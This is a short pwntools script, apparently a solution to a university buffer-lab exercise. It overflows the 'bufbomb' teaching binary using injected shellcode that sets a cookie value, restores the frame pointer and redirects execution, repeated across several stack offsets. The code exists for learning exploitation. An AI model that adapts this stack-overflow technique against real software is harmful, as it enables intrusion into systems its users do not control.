from pwn import *

f = open("./ID", "r")
id = f.read()
f.close()

sh = process(['./bufbomb', '-u', id, '-n'])

ebp = 0x556834a0
ebpp = 0x556834d0
ret = 0x08048e15
cookie = 0x274adc8a
offsets = [0, -112, 64, 48, -64]

for offset in offsets:
    shellcode = asm('mov eax, ' + str(cookie) + '; mov ebp, ' + str(ebpp - offset) + '; push ' + str(ret) + '; ret;')

    exploit = flat([shellcode.ljust(520, 'a'), ebp - offset, ebp - offset - 520])
    sh.sendline(exploit)
    
    print sh.recv()

sh.interactive()
